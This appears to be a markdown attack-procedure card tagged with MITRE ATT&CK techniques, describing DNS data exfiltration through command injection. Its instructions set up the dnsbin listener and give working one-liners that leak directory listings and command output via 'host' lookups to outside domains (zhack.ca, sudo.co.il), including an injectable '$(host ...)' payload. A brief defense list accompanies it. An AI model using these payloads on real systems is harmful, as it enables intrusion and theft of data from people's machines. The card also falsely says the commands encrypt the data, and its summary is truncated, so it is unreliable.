---
id: 0e1cedb9-8b3c-446d-9a19-e04af6aa6b2e
name: DNS Data Exfiltration with Command Injection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:57.498972+00:00'
updated_at: '2023-04-06T03:55:57.521915+00:00'
tactics:
- '[[Exfiltration|TA0010 - Exfiltration]]'
techniques:
- '[[Data Encrypted|T1022 - Data Encrypted]]'
- '[[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative
  Protocol]]'
tags:
- '[[Command Injection]]'
- '[[DNS based data exfiltration]]'
commands:
- '[[Change directory to dnsbin]]'
- '[[Clone dnsbin repository]]'
- '[[Execute ls command]]'
- '[[Install requirements]]'
- '[[Start dnsbin server]]'
---

# DNS Data Exfiltration with Command Injection

## Summary

DNS based data exfiltration is a technique used by attackers to bypass network security controls and exfiltrate data from a compromised system. In this attack, the attacker uses a command injection vulnerability to execute arbitrary commands on the target system. The attacker then uses DNS queries 

## Description

# Description

DNS based data exfiltration is a technique used by attackers to bypass network security controls and exfiltrate data from a compromised system. In this attack, the attacker uses a command injection vulnerability to execute arbitrary commands on the target system. The attacker then uses DNS queries to exfiltrate the data. This technique is effective because DNS traffic is often allowed through firewalls and other security controls.

To perform DNS based data exfiltration with command injection, the attacker uses a tool like dnsbin to set up a DNS server that will receive the exfiltrated data. The attacker then injects commands into the target system to exfiltrate the desired data over DNS queries. The data is encoded and encrypted to avoid detection by security controls. This attack can be used to exfiltrate sensitive data such as passwords, credit card information, and intellectual property.

## Requirements

1. Access to a vulnerable system with a command injection vulnerability

1. A DNS server to receive exfiltrated data

1. A tool like dnsbin to set up the DNS server

1. Knowledge of commands to execute on the target system

## Defense

1. Implement input validation to prevent command injection vulnerabilities

1. Monitor DNS traffic for unusual activity

1. Implement DNS security controls such as DNSSEC and DNS filtering to prevent exfiltration over DNS

## Objectives

1. Exfiltrate sensitive data from a compromised system

1. Bypass network security controls

# Instructions

1. 

**Code**: [[https://github.com/HoLyVieR/dnsbin]]

> 

**Command** ([[Clone dnsbin repository]]):

```bash
git clone https://github.com/HoLyVieR/dnsbin.git
```

**Command** ([[Change directory to dnsbin]]):

```bash
cd dnsbin
```

**Command** ([[Install requirements]]):

```bash
pip install -r requirements.txt
```

**Command** ([[Start dnsbin server]]):

```bash
python dnsbin.py
```

2. 1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done

**Code**: [[1. Go to http://dnsbin.zhack.ca/
2. Execute a simp]]

> This command will exfiltrate the output of the 'ls' command by using DNS queries to send the data to the DNS server set up with dnsbin. The data is encoded and encrypted to avoid detection by security controls.

**Command** ([[Execute ls command]]):

```bash
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

3. $(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)

**Code**: [[$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d ']]

> This command will exfiltrate the output of the 'wget -h' command by using DNS queries to send the data to the DNS server. The data is encoded and encrypted to avoid detection by security controls.

## MITRE ATT&CK Mapping

### Tactics

- [[Exfiltration|TA0010 - Exfiltration]]

### Techniques

- [[Data Encrypted|T1022 - Data Encrypted]]
- [[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative Protocol]]

## Commands Used

- [[Change directory to dnsbin]]
- [[Clone dnsbin repository]]
- [[Execute ls command]]
- [[Install requirements]]
- [[Start dnsbin server]]

## Tags

- [[Command Injection]]
- [[DNS based data exfiltration]]
